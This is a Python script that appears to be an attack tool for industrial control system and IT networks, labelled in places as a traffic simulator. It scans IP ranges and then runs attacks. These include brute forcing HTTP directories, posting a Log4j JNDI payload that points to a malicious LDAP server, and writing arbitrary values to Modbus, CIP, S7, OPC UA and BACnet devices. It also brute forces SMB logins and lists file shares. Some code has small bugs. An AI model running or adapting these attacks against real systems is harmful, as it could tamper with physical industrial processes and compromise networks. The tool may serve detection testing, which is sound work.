import ipaddress
import argparse
import socket
import sys
import requests
from pymodbus.client import ModbusTcpClient
from pycomm3 import LogixDriver
import snap7
from opcua import Client as OPCClient
import BAC0
import random
from smb.SMBConnection import SMBConnection
import time

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--range", help="input IP ranges in CIDR notation seperated by a comma. E.G. 192.168.0.0/24,192.167.1.0/24", required=True)
parser.add_argument("-a", "--aggressiveness", help="how aggressive, between 1 and 3 with 3 being the most aggressive, do you want the scans (default 3)", type=int)
parser.add_argument("--http_brute", help="brute force http pages", action='store_true')
parser.add_argument("--http_wordlist", help="file containing wordlist to brute-force")
parser.add_argument("--http_log4j", help="attempt POST exploitation of Log4J", action='store_true')
parser.add_argument("--http_log4j_server", help="IP address of malicious LDAP server")
parser.add_argument("--modbus", help="Simulate Modbus Traffic", action='store_true')
parser.add_argument("--cip", help="Simulate CIP Traffic", action='store_true')
parser.add_argument("--s7", help="Simulate S7 Traffic", action='store_true')
parser.add_argument("--opcua", help="Simulate Opcua Traffic", action='store_true')
parser.add_argument("--bacnet", help="Simulate Bacnet Traffic", action='store_true')
parser.add_argument("--bacnet_target", help="Target (UDP) for Bacnet attack")
parser.add_argument("--smb", help="Perform SMB Attacks", action='store_true')
parser.add_argument("--smb_userfile", help="Username List for Brute Forcing")
parser.add_argument("--smb_passfile", help="Password List for Brute Forcing")
args = parser.parse_args()

#Attack dictionaries - used to store key:value paris for IPs and ports
modbus_attack_list = []
http_attack_list = []
telnet_attack_list = []
smb_attack_list = []
cip_attack_list = []
s7_attack_list = []
opcua_attack_list = []

#Relevant ports to simulate traffic
MODBUS = 502
TELNET = 23
HTTP = 80
SMB = 445
CIP = 44818
S7 = 102
OPCUA = 4840

port_list = [MODBUS, TELNET, HTTP, SMB, CIP, S7, OPCUA]

def cidr_to_ip_range(cidr):
    ips_total = []
    networks = cidr.split(",")
    for network in networks:
        try:
            nw = ipaddress.IPv4Network(network, strict=False)
            for ip in nw:
                ips_total.append('%s' % ip)      
        except (ValueError, ipaddress.AddressValueError) as e:
            return str(e)
    return ips_total

def tcp_scan(ip, port):
    if args.aggressiveness == 1:
        timeout = 0.7
    elif args.aggressiveness == 2:
        timeout = 0.4
    else:
        timeout = 0.1

    try:
        # Create a new socket
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.settimeout(timeout)    
        # Print if the port is open
        if not tcp.connect_ex((ip, port)):
            if port == MODBUS:
                modbus_attack_list.append(ip)
            elif port == TELNET:
                telent_attack_list.append(ip)
            elif port == HTTP:
                http_attack_list.append(ip)
            elif port == SMB:
                smb_attack_list.append(ip)
            elif port == CIP:
                cip_attack_list.append(ip)
            elif port == S7:
                s7_attack_list.append(ip)
            elif port == OPCUA:
                opcua_attack_list.append(ip)
            else:
                pass
            tcp.close()
                
    except Exception:
        pass

def scan_ips(ip_list):
    for ip in ip_list:
        for port in port_list:
            tcp_scan(ip, port)

def http_brute_attack():
    if args.http_wordlist is not None:
        with open(args.http_wordlist) as f:
            directories = f.read().splitlines()
        for target in http_attack_list:
            print ("HTTP Brute Force Attack Commencing on "+target)
            for page in directories:
                url = "http://"+target+"/"+page
                r = requests.get(url)
                if r.status_code == 200:
                    print("Page for host "+target+" found at /"+page)
                else:
                    pass           
    else:
        print("No wordlist set. This attack requires a wordlist. Skipping...")

def http_log4j_attack():
    if args.http_log4j_server is not None:
        data = "${jndi:ldap://"+args.http_log4j_server+"/a}"
        for target in http_attack_list:
            print ("Log4J Attack Commencing on "+target)
            url = "http://"+target
            r = requests.post(url, data=data)
            print ("Log4J Attack Complete. Look for results :)")
    else:
        print("No malicious LDAP server set. Skipping...") 

def modbus_sim():
    print("Sending a whole lot of Modbus")
    for target in modbus_attack_list:
        try:
            client = ModbusTcpClient(target)
            connection = client.connect()          
            client.write_register(100, 1234)
            client.write_register(101, 5678)
            client.write_registers(200, [random.randint(0, 65535) for _ in range(50)])
            for fc in [0, 99, 128]:
                try:
                    client.read_coils(fc, 1)
                except:
                    pass
        except Exception as e:
            print("Error connecting to Modbus Target")

def bacnet_sim(target):
    if args.bacnet_target is not None:
        print("Doing malicious Bacnet Stuff on target")
        bacnet = BAC0.lite(ip=target)
        bacnet.whois()
        value = bacnet.readMultiple(target+" device 100001 all")
        print(value)
        bacnet.write(target+' analogOutput 7 presentValue 100.0 - 16')
    else:
        print("You must supply an IP address to target. Skipping.")

def cip_sim():
    print("Sending CIP Packets")
    for target in cip_attack_list:
        try:
            with LogixDriver(f'ethernet/ip/{target}/1') as plc:
                plc.read('Program:MainProgram.A')
                plc.write('Program:MainProgram.A', 42)
                for _ in range(20):
                    plc.write('Program:MainProgram.A', 42)
        except Exception as e:
            print("Error connecting to CIP Target")       

def s7_sim():
    print("Sending S7 Packets")
    for target in s7_attack_list:
        try:
            client = snap7.client.Client()
            client.connect(target, 0, 1) 
            client.db_write(1, 0, b'\x01\x02\x03\x04')
            for _ in range(1000):
                client.db_read(1, 0, 4)
            for _ in range(20):
                client.db_write(1, 0, b'\x01\x02\x03\x04')
   
        except Exception as e:
            print("Error connecting to S7 Target")   

def opcua_sim():
    print("Sending OPCUA Packets")
    for target in opcua_attack_list:
        try:
            client = OPCClient(f"opc.tcp://{target}:4840")
            client.connect() 
            root = client.get_root_node() 
            print(f'Root node is {root}')
            var = client.get_node("ns=2;i=2") 

            print(f'Node : {var}')
            print(f'Value of node :{var.get_value()}') # Get and print only value of thge node
            print(f'Full value of node : {var.get_data_value()}') # Get and print full value of the node
            var.set_value(1.3) # Set value into 1.3
            print(f'New value is : {var.get_value()}') # Get and print full value of the node 
   
        except Exception as e:
            print("Error connecting to OPCUA Target")   

def smb_sim():
    if args.smb_userfile is not None and args.smb_passfile is not None:
        print("Doing Malicious Windows Stuff hehe")
        for target in smb_attack_list:
            with open(args.smb_userfile) as f:
                usernames = f.read().splitlines()
            with open(args.smb_passfile) as fg:
                passwords = fg.read().splitlines()
            clientname = 'localmachine'
            server_name = 'servername'
            domain_name = 'domainname'
            for user in usernames:
                for password in passwords:
                    time.sleep(2)
                    try:
                        conn = SMBConnection(user, password, clientname, server_name, domain=domain_name, use_ntlm_v2=True, is_direct_tcp=True)
                        conn.connect(target, 445)
                        shares = conn.listShares()
                        for share in shares:
                            if not share.isSpecial and share.name not in ['NETLOGON', 'SYSVOL']:
                                sharedfiles = conn.listPath(share.name, '/')
                                for sharedfile in sharedfiles:
                                    print(sharedfile.filename)
                        conn.close()
                    except:
                        print("Username/password combination: "+user, password+" did not work")
            '''
            
            for user in usernames:
                for password in passwords:
                    try:
                        conn = SMBConnection(user,password,'host', 'host', domain='workgroup', use_ntlm_v2=True) 
                        conn.connect(target, 445)
                    except:
                        print("Username/password combination: "+user, password+" did not work")'''
    else:
        print("You need to supply a userfile and passfile. Skipping.")

def main():
    #Step 1 - determine possible IPs
    cidr = args.range
    ip_list = cidr_to_ip_range(cidr)
    
    #Step 2 - find relevant ports open and assign to each attack dictionary
    scan_ips(ip_list)
    print("Modbus Servers Discoverd: ",modbus_attack_list)
    print("Telnet Servers Discoverd: ",telnet_attack_list)
    print("HTTP Servers Discoverd: ",http_attack_list)
    print("SMB Servers Discoverd: ",smb_attack_list)
    print("CIP Servers Discoverd: ",cip_attack_list)
    print("S7 Servers Discoverd: ",s7_attack_list)
    print("OPCUA Servers Discoverd: ",opcua_attack_list)

    #Step 3 - iterate through which attacks are set and run through them
    if args.http_brute:
        http_brute_attack()

    if args.http_log4j:
        http_log4j_attack()

    if args.modbus:
        modbus_sim()

    if args.cip:
        cip_sim()

    if args.s7:
        s7_sim()

    if args.opcua:
        opcua_sim()

    if args.bacnet:
        bacnet_sim(args.bacnet_target)

    if args.smb:
        smb_sim()

if __name__ == "__main__":
    main()
